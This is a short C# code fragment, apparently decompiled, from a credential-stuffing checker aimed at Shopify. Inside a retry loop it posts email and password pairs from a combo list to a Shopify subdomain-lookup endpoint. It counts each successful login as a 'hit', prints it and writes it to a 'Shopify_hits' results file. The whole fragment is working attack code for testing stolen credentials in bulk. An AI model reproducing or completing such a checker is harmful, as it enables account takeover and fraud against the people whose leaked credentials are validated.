        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://app.shopify.com/services/find_subdomain.json", "{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}", "application/json").ToString().Contains("{\"subdomain\":\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - SHOPIFY] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Shopify_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
